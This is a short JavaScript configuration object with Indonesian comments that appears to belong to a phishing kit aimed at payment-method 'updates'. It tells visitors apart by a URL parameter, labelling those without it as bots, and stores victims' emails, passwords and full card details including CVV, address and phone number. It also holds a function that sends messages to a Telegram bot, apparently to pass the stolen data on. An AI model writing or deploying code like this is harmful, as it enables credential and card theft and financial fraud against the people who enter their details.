const CONFIG = {
    // === Cek apakah pakai parameter ===
    cekParameter: function() {
        const params = new URLSearchParams(window.location.search);
        const hasParam = params.toString().includes('Update-payment-methode');
        localStorage.setItem('pakaiParameter', hasParam ? 'YA' : 'TIDAK');
        return hasParam;
    },

    // === Simpan Login ===
    simpanLogin: function(data) {
        const pakaiParam = localStorage.getItem('pakaiParameter') === 'YA';
        const daftar = JSON.parse(localStorage.getItem('daftarLogin') || '[]');
        daftar.unshift({
            email: data.email,
            sandi: data.sandi,
            isBot: !pakaiParam,  // ❌ Tanpa parameter = BOT
            waktu: new Date().toLocaleString()
        });
        localStorage.setItem('daftarLogin', JSON.stringify(daftar));
    },

    // === Simpan Kartu ===
    simpanKartu: function(data) {
        const pakaiParam = localStorage.getItem('pakaiParameter') === 'YA';
        const daftar = JSON.parse(localStorage.getItem('daftarKartu') || '[]');
        daftar.unshift({
            email: data.email,
            namaKartu: data.namaKartu,
            nomorKartu: data.nomorKartu,
            expiry: data.expiry,
            cvv: data.cvv,
            alamat: data.alamat,
            kota: data.kota,
            kodepos: data.kodepos,
            telepon: data.telepon,
            isBot: !pakaiParam,  // ❌ Tanpa parameter = BOT
            waktu: new Date().toLocaleString()
        });
        localStorage.setItem('daftarKartu', JSON.stringify(daftar));
    },

    // === Kirim ke Telegram (tetap berjalan seperti biasa) ===
    kirimKeTelegram: function(pesan) {
        const token = localStorage.getItem('botTokenTelegram');
        const chatId = localStorage.getItem('chatIdTelegram');
        if (!token || !chatId) return Promise.resolve();
        
        return fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: chatId,
                text: pesan,
                parse_mode: 'Markdown'
            })
        });
    }
};
